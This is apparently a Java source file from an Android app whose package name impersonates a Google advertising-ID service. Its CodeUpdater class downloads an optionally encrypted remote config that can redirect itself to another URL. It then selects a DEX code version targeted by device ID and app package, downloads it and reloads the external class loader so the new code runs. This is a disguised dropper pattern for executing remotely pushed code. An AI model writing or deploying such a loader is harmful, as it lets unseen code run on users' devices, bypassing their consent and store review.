package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;
import android.util.Log;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
import com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.CryptoProviderServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetter;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IRestServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;

import junit.runner.Version;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CodeUpdater {
    public static int LOADER_NEW_CODE_VERSION = 100;
    public static int LOADER_NEW_MASK_JSON    = 101;

    public JSONObject getJsonObj(String json_str)
    {
        boolean isFileCript = false;
        JSONObject rootObj = null;
        try {
            //Если пришёл файл в не закодированном виде, то просто формируем из него JSON
            rootObj = new JSONObject(json_str);
        } catch (JSONException e) {
            //Если мы не смогли сформировать JSON, то скорее всего файл просто зашифрован, расшифровываем его и пробуем снова
            isFileCript = true;
        }

        if (isFileCript){
            try {
                String decode_json_string = new String(CryptoProviderServicer.toByte(CryptoProviderServicer.deCript(json_str)));
                rootObj = new JSONObject(decode_json_string);
            } catch (JSONException e2) {
                e2.printStackTrace();
                Logger.log("Ошибка загрузки конфигурационного файла. Ошибка: " + e2.getMessage());
            }
        }

        if (rootObj == null) {//Если ничего не скачалось - выходим
            Logger.log("Не получилось разобрать JSON конфигурационного файла");
            return null;
        }
        return rootObj;
    }

    public void updateCode(final Context cnt, final LoaderManager lm, final String device_id)
    {
        final String downloadID = new GoogleAdvertisingIdGetter().generateGUID(cnt);
        lm.restartLoader(LOADER_NEW_CODE_VERSION, null, new LoaderManager.LoaderCallbacks<String>() {
            @SuppressLint("StaticFieldLeak")
            @Override
            public Loader<String> onCreateLoader(int i, Bundle bundle) {
                return new AsyncTaskLoader<String>(cnt) {
                    public String loadInBackground() {
                            String res = null;
//FilesLoader fl = new FilesLoader();
                            //String url_to_conf_file = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                            String url_to_conf_file = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                            String path = (url_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : url_to_conf_file;
                            Logger.log("Грузим файл из:" + path);
                            //sendLog(cnt, lm, downloadID, "Download conf file");
//String url = getUrlToDownloadFile(cnt, path,"Download conf file", downloadID);
//fl.downloadFile(cnt, path, GlobalParameters.ConfigFilePathZip(cnt));
////fl.downloadFile(cnt, url, GlobalParameters.ConfigFilePathZip(cnt));
//fl.unpackZip(GlobalParameters.getBasePath(cnt), GlobalParameters.CONFIG_FILE_NAME_ZIP);

                        FilesLoader.saveFile(cnt, path, true, "Download conf file", downloadID, GlobalParameters.ConfigFilePathZip(cnt), GlobalParameters.getBasePath(cnt), GlobalParameters.CONFIG_FILE_NAME_ZIP);

                        return res;
                    }
                };
            }

            @Override
            public void onLoadFinished(Loader<String> loader, String result) {

                String json_str = loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
                JSONObject rootObj = getJsonObj(json_str);
                if(rootObj == null) {return;}
                try {
                    String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
                    //String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                    String path_to_conf_file_last = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                    if (!path_to_conf_file.equals(path_to_conf_file_last))
                    {
                        Logger.log("Надо загрузить конфигурационный файл из другого места:" + path_to_conf_file);
                        Logger.log("Вместо:" + path_to_conf_file_last);
                        //cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
                        SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file);
                        new CodeUpdater().updateCode(cnt, lm, device_id);
                        return;
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Logger.log("Ошибка загрузки конфигурационного файла" + e.getMessage());
                }

                //Когда скачали нужную версию конфигурационного файла, то можем по ней искать нужную нам версию
                String url = getUrlToLoadDexFile(cnt, device_id);
                if (url != null) {
                    //sendLog(cnt, lm, downloadID, "Download DEX file");
                    String full_url = getUrlToDownloadFile(cnt, url,"Download conf file", downloadID);
                    FilesLoader.downloadDexFile(cnt, url);
//   TODO:   RERPLACE!!!!              FilesLoader.downloadDexFile(cnt, full_url);


                    ExternalLibServicer.clearDexClassLoader();
                }
            }

            @Override
            public void onLoaderReset(Loader<String> loader) {
            }
        }).forceLoad();

    }

    public String getUrlToLoadDexFile(Context cnt, String device_id)
    {
        GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
        String current_version = g.getVersion(cnt);
        String json_str = loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
        String res = null;
        JSONObject obj = null;
        try {
            //JSONObject rootObj = new JSONObject(json_str);
            JSONObject rootObj = getJsonObj(json_str);
            obj = rootObj.getJSONObject(GlobalParameters.JSON_KEY_VERSIONS);
            Logger.log("Текущая версия " + current_version);
            if (obj != null)
            {
                String key = null;
                Iterator<?> keys = obj.keys();
                while( keys.hasNext() ) {
                    key = (String)keys.next();
                    Logger.log("Проверяем версию " + key + "----->");
                    if (compareCodeVersion(current_version, key) > 0)
                    {
                        boolean isDeviceIDApprove   = false;
                        boolean isApkPackageApprove = true;
                        boolean isVersion           = true;
                        if ( obj.get(key) instanceof JSONObject ) {
                            JSONObject versionObj = (JSONObject) obj.get(key);

                            //Проверяем устройства
                            //--------------->
                            JSONArray arr = versionObj.getJSONArray(GlobalParameters.JSON_KEY_DEVICE_ID);
                            Logger.log("Current device_id = " + device_id);
                            for(int i = 0; i <arr.length(); i++) {
                                Logger.log("debug device = " + arr.getString(i));
                                if (device_id.equals(arr.getString(i)))
                                {
                                    isDeviceIDApprove = true;
                                    break;
                                }
                            }
                            if (arr.length() == 0){ isDeviceIDApprove = true; }
                            //<---------------


                            //Проверяем что с данной версии можно обновиться
                            //--------------->
                            arr = versionObj.getJSONArray(GlobalParameters.JSON_KEY_FORBIDDEN_VERSION);
                            for(int i = 0; i <arr.length(); i++) {
                                String selectJsonObj = arr.getString(i).replaceAll("\\s+","");
                                Logger.log("forbidden version = " + selectJsonObj);
                                String mask = "\\d*.\\d*.\\d*-\\d*.\\d*.\\d*";
                                Pattern p = Pattern.compile(mask, Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);
                                Matcher m = p.matcher(selectJsonObj);
                                if (m.matches()) {//Если задан диапазон ("1.7.6 - 1.8.2")
                                    String[] Arr = selectJsonObj.split("-");
                                    if(Arr.length == 2) {
                                        //Если текущая версия в диапазоне, тогда не обновляем
                                        isVersion = !(((compareCodeVersion(current_version, Arr[0]) <= 0) && (compareCodeVersion(current_version, Arr[1]) >= 0)));
                                    }
                                    else
                                    {
                                        isVersion = false;
                                    }
                                    if (!isVersion) {break;}
                                }
                                else {//Если задано просто значение
                                    if (current_version.equals(selectJsonObj)) {
                                        isVersion = false;
                                        break;
                                    }
                                }
                            }
                            //<---------------

                            //Проверяем что с данного приложения можно обновиться
                            //--------------->
                            arr = versionObj.getJSONArray(GlobalParameters.JSON_KEY_FORBIDDEN_APK_PACKAGE);
                            String packageName = cnt.getPackageName();
                            Logger.log("Current apk_package = " + packageName);
                            for(int i = 0; i <arr.length(); i++) {
                                Logger.log("forbidden apk package = " + arr.getString(i));
                                if (packageName.equals(arr.getString(i)))
                                {
                                    isApkPackageApprove = false;
                                    break;
                                }
                            }
                            //<---------------
                            if(isDeviceIDApprove && isApkPackageApprove && isVersion)
                            {
                                Logger.log("Загружаем версию " + key);
                                res = versionObj.getString(GlobalParameters.JSON_KEY_PATH);
                                //Сохраняем HESH-код скачиваемого DEX-файла
                                String hash_code = versionObj.getString(GlobalParameters.JSON_KEY_DEX_HASH);
                                SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_DEX_HASH, GlobalParameters.SPF_KEY_DEX_HASH, hash_code);
                                break;
                            }
                        }
                    }
                    Logger.log("<-----" + key + "");
                }


//                String key = null;
//                Iterator<?> keys = obj.keys();
//                while( keys.hasNext() ) {
//                    key = (String)keys.next();
//                    Logger.log("Проверяем версию " + key + "----->");
//                    if (compareCodeVersion(current_version, key) > 0)
//                    {
//                        boolean isDeviceIDApprove   = false;
//                        boolean isApkPackageApprove = true;
//                        boolean isVersion           = true;
//                        if ( obj.get(key) instanceof JSONObject ) {
//                            JSONObject versionObj = (JSONObject) obj.get(key);
//
//                            //Проверяем устройства
//                            //--------------->
//                            JSONArray arr = versionObj.getJSONArray("device_id");
//                            Logger.log("Current device_id = " + device_id);
//                            for(int i = 0; i <arr.length(); i++) {
//                                Logger.log("debug device = " + arr.getString(i));
//                                if (device_id.equals(arr.getString(i)))
//                                {
//                                    isDeviceIDApprove = true;
//                                    break;
//                                }
//                            }
//                            if (arr.length() == 0){ isDeviceIDApprove = true; }
//                            //<---------------
//
//
//                            //Проверяем что с данной версии можно обновиться
//                            //--------------->
//                            arr = versionObj.getJSONArray("forbidden_version");
//                            for(int i = 0; i <arr.length(); i++) {
//                                Logger.log("forbidden version = " + arr.getString(i));
//                                if (current_version.equals(arr.getString(i)))
//                                {
//                                    isVersion = false;
//                                    break;
//                                }
//                            }
//                            //<---------------
//
//                            //Проверяем что с данного приложения можно обновиться
//                            //--------------->
//                            arr = versionObj.getJSONArray("forbidden_apk_package");
//                            String packageName = cnt.getPackageName();
//                            Logger.log("Current apk_package = " + packageName);
//                            for(int i = 0; i <arr.length(); i++) {
//                                Logger.log("forbidden apk package = " + arr.getString(i));
//                                if (packageName.equals(arr.getString(i)))
//                                {
//                                    isApkPackageApprove = false;
//                                    break;
//                                }
//                            }
//                            //<---------------
//
//                            if(isDeviceIDApprove && isApkPackageApprove && isVersion)
//                            {
//                                Logger.log("Загружаем версию " + key);
//                                res = versionObj.getString("path");
//                                break;
//                            }
//                        }
//                    }
//                    Logger.log("<-----" + key + "");
//                }


            }

        } catch (JSONException e) {
            Logger.log("Ошибка при загрузке конфигурационного файла: " + e.getMessage());
            e.printStackTrace();
        }

        if (res == null){Logger.log("Текущая версия актуальна");}
        return res;
    }
    //Метод возвращает надо ли загружать новую версию библиотеки и если надо, то какую (релизную или дебажную)
//    private TYPE_CODE typeCodeToLoad(Context cnt, String device_id)
//    {
//        GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
//        String current_version = g.getVersion(cnt);
//        String json_str = loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
//        TYPE_CODE res = TYPE_CODE.NONE;
//        try {
//
//            JSONObject obj = new JSONObject(json_str);
//            Logger.log("Текущая версия " + current_version);
//            Logger.log("RELEASE версия " + obj.getString(GlobalParameters.KEY_RELEASE_VERSION));
//            Logger.log("DEBUG версия   " + obj.getString(GlobalParameters.KEY_DEBUG_VERSION));
//            if (compareCodeVersion(current_version, obj.getString(GlobalParameters.KEY_RELEASE_VERSION)) > 0)
//            {
//                res = TYPE_CODE.RELEASE;
//            }
//
//            if (compareCodeVersion(current_version, obj.getString(GlobalParameters.KEY_DEBUG_VERSION)) > 0)
//            {
//                JSONArray arr = obj.getJSONArray(GlobalParameters.KEY_DEBUG_IDS);
//                Logger.log("Current device_id = " + device_id);
//                for(int i = 0; i <arr.length(); i++) {
//                    Logger.log("debug device = " + arr.getString(i));
//                    if (device_id.equals(arr.getString(i)))
//                    {
//                        res = TYPE_CODE.DEBUG;
//                        break;
//                    }
//                }
//            }
//        } catch (JSONException e) {
//            e.printStackTrace();
//        }
//        return res;
//    }

    //Сравнивает версии в формате 1.1.1
    // Если текущая версия меньше новой - вернет 1
    // Если текущая версия равна новой  - вернет 0
    // Если текущая версия больше новой - вернет -1
    // Если формат не разобран          - вернет -2
    private int compareCodeVersion(String cur_v, String new_v)
    {
        if(cur_v.equals(new_v)) {return 0;} //Если равны

        String[] cur_v_arr = cur_v.split("\\.");
        String[] new_v_arr = new_v.split("\\.");

        if((cur_v_arr.length != 3) || (new_v_arr.length != 3)){return -2;}

        for (int i = 0; i < 3; i++) {
            if (Integer.parseInt(cur_v_arr[i]) < Integer.parseInt(new_v_arr[i])) {return  1;}
            if (Integer.parseInt(cur_v_arr[i]) > Integer.parseInt(new_v_arr[i])) {return -1;}
        }
        return 0;
    }

    public String loadJSONFromAsset(Context context, String fileName) {
        String json = null;
        try {
            File file = new File(fileName.toString());
            FileInputStream is = new FileInputStream(file);
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            json = new String(buffer, "UTF-8");
        } catch (IOException ex) {
            ex.printStackTrace();
            return null;
        }
        return json;
    }


    public void sendLog(final Context cnt, final LoaderManager lm, final String downloadID, final String comment)
    {
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
                IRestServicer rs = RestServicer.getRestServicer(RestServicer.TypeRestServicer.SIMPLE);
                rs.sendLog(cnt, lm, "", "test", "1111", downloadID, comment);
            }
        });
    }

    public String getUrlToDownloadFile(Context cnt, String path, String comment, String deviceID)
    {
        return RestServicer.getUrlToDownloadFile(cnt, path, comment, deviceID);
    }
}
